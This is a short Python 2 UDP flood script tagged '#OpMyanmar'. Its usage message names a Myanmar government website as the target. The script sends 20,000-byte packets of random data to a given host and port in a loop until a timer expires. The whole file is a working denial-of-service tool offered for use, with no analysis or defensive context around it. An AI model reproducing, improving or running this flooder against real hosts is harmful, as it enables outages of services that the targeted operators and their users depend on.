import time
import socket
import random
import sys
def usage():

	print "#OpMyanmar"
	print "usage: python2 lulz2.py http://www.dica.gov.mm"

def flood(victim, vport, duration):
    # #OpMyanmar
    # UPD-Flood
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Threat response
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mPacket \033[1;32m%s \033[1;91mUsage \033[1;32m%s \033[1;91m port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
